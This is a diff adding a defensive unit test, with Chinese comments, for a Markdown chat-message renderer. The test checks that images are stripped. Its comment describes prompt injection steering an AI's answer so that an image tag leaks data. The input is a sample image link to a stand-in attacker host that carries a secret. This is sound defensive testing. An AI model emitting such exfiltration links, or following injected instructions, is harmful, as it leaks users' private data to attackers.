@@ -75,3 +75,13 @@ describe('MarkdownMessage 的程式碼呈現', () => {
     expect(html).toContain('hljs-tag');
   });
 });
+
+describe('MarkdownMessage 的圖片', () => {
+  it('不載入任何圖片（AI 的回答可能被工具讀到的內容引導，圖片會自己把資料送到別的網站），只留下文字', () => {
+    const html = render('看這裡 ![你的持股](https://evil.example/p?d=SECRET) 結束');
+    expect(html).not.toContain('<img');
+    expect(html).not.toContain('evil.example');
+    expect(html).toContain('〔圖片：你的持股〕');
+    expect(render('![](https://evil.example/p)')).toContain('〔圖片〕');
+  });
+});
